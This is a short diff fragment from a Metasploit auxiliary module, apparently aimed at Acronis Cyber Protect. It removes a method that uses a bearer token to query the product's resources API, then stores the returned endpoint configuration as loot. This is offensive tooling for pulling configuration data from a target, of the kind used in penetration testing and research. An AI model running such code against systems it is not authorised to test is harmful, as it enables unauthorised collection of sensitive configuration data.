@@ -67,36 +67,6 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  # return all configured items in json format or return nil if not successful
-  def get_machine_info(access_token2)
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'api', 'ams', 'resources'),
-      'ctype' => 'application/json',
-      'keep_cookies' => true,
-      'headers' => {
-        'X-Requested-With' => 'XMLHttpRequest',
-        'Authorization' => "bearer #{access_token2}"
-      },
-      'vars_get' => {
-        'embed' => 'details'
-      }
-    })
-    return unless res&.code == 200
-    return unless res.body.include?('items') || res.body.include?('data')
-
-    if datastore['OUTPUT'] == 'json'
-      loot_path = store_loot('acronis.cyber.protect.config', 'application/json', datastore['RHOSTS'], res.body, 'configuration', 'endpoint configuration')
-      print_good("Configuration details are successfully saved in json format to #{loot_path}")
-    end
-
-    # parse json response and get the relevant machine info
-    res_json = res.get_json_document
-    return if res_json.blank?
-
-    res_json
-  end
-
   def check
     # initial check on api access
     res = send_request_cgi({
